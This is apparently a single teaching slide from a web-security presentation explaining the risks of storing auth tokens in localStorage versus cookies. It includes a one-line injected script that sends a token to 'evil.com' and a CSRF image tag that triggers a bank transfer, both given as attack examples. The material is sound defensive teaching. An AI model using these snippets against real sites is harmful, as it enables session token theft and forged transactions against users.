---
transition: slide-left
---

# Client-Side Storage Risks

<div class="grid grid-cols-2 gap-6 mt-6">

<div v-click
  v-motion
  :initial="{ y: 40, opacity: 0 }"
  :enter="{ y: 0, opacity: 1, transition: { duration: 600 } }"
  class="p-5 rounded-xl border border-orange-400/40 bg-orange-900/10"
>
  <div class="text-orange-300 font-bold text-lg mb-2">🗄️ Local / Session Storage</div>
  <div class="text-red-400 font-semibold mb-1">Vulnerable to XSS</div>
  <div class="text-gray-400 text-sm mb-3">If an attacker runs JavaScript on your domain, they can read the token directly.</div>

```js
// Attacker's injected script
fetch('https://evil.com?t=' + localStorage.getItem('token'))
```
</div>

<div v-click
  v-motion
  :initial="{ y: 40, opacity: 0 }"
  :enter="{ y: 0, opacity: 1, transition: { duration: 600 } }"
  class="p-5 rounded-xl border border-pink-400/40 bg-pink-900/10"
>
  <div class="text-pink-300 font-bold text-lg mb-2">🍪 Cookies</div>
  <div class="text-red-400 font-semibold mb-1">Vulnerable to CSRF</div>
  <div class="text-gray-400 text-sm mb-3">The browser automatically sends the cookie upon cross-domain requests.</div>

```html
<!-- Attacker's page -->
<img src="https://bank.com/transfer?to=attacker">
```
</div>

</div>

<div v-click
  v-motion
  :initial="{ scale: 0.9, opacity: 0 }"
  :enter="{ scale: 1, opacity: 1, transition: { delay: 200, duration: 600 } }"
  class="mt-6 p-4 rounded-xl border border-red-500/60 bg-red-900/20 text-center"
>
  <div class="text-red-300 font-bold text-lg">⚡ The Inherent Flaw of Bearer Tokens</div>
  <div class="text-gray-300 mt-1 text-sm italic">"Whoever bears the token, gets the access." If an attacker steals a token, they can impersonate the user completely until expiry.</div>
</div>
